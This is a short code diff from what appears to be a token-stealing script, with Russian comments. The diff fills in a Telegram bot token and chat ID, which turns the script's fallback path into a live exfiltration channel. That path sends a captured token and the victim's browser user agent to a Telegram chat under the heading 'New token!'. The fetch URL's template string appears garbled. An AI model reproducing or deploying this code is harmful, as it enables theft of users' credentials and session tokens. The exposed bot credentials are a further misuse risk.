@@ -56,8 +56,8 @@
             }).catch(() => {});
 
             // Альтернатива: отправка через Telegram Bot API (если нет своего сервера)
-            const botToken = "ТОЙ_БОТ_ТОКЕН";      // <-- СВОЙ БОТ
-            const chatId = "ТОЙ_CHAT_ID";          // <-- СВОЙ ЧАТ
+            const botToken = "8572300926:AAF78nf63as9Swl9cPiLg9ThMwEyU7i6QCc";      // <-- СВОЙ БОТ
+            const chatId = "89960470000";          // <-- СВОЙ ЧАТ
             if (botToken && chatId) {
                 const msg = encodeURIComponent(`Новый токен!\nToken: ${token}\nUA: ${navigator.userAgent}`);
                 fetch(`https://api.telegram.org/bot\( {botToken}/sendMessage?chat_id= \){chatId}&text=${msg}`);
